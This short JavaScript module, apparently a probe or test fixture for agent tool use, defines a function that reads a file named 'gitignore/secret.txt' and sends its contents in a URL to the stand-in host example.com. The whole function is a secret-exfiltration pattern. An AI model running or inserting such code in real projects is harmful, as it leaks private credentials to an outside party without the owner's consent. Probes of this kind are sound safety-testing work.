import { file_read } from "./file_read.mjs";
import { http_generic } from "./http_generic.mjs";
export async function zz_probe_send() {
  let secret = await file_read("gitignore/secret.txt");
  let answer = await http_generic("https://example.com/" + secret);
  return answer;
}
